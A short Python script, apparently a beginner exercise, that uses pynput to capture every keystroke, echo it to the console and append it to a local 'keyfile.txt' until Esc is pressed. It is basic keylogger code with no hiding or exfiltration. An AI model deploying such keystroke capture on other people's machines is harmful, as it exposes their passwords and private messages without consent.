from pynput import keyboard

def on_press(key):
    try:
        char = key.char
        print(char)
        log_key(char)
    except AttributeError:
        if key == keyboard.Key.space:
            print('space')
            log_key(' ')
        elif key == keyboard.Key.enter:  
            print('enter')
            log_key('\n')
        elif key == keyboard.Key.backspace:
            print('backspace')
            delete_last_char()
        else:
            print(f'special key {key}')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def log_key(char):
    with open("keyfile.txt", 'a') as logkey:
        logkey.write(char)

def delete_last_char():
    with open("keyfile.txt", 'r+') as logkey:
        logkey.seek(0, 2)
        logkey.truncate(logkey.tell() - 1)

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()   
